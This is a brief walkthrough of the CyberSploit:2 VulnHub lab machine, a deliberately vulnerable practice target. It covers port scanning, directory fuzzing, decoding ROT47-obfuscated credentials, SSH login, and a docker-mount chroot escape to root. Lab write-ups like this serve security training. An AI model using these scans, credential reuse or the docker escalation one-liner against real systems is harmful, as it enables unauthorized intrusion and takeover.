

# CyberSploit:2 Walkthrough

**VulnHub Link:** [CyberSploit:2](https://www.vulnhub.com/entry/cybersploit-2,511/)
**Difficulty:** Easy
**Release Date:** 16 Jul 2020


## 1.Reconnaissance
```bash
rustscan -a 172.16.147.128  --ulimit 5000
nmap -sV -A -O -T5 -sC 172.16.147.128 -p22,80
```

We see it is about web)

## 2.Web Enumeration
We are doing some common directory searching 
```bash
ffuf -w /usr/share/wordlists/rockyou.txt -u http://172.16.147.128/FUZZ
```

WE found nothing from Ffuf(

Some usernames and passwords found on the web page

First , i want to make wordlist contains these usernames and passwords but one row is different from others

D92:=6?5C2 and 4J36CDA=@:E`

We searched it and found out ROT47 , credentials breached --->

shailendra:cybersploit1

```bash
ssh shailendra@172.16.147.128
```

## 3.Privilege Escalation
```bash
sudo -l
```

We found out we have docker id (We can also find it by reading hint.txt)
```bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

We are Root.!
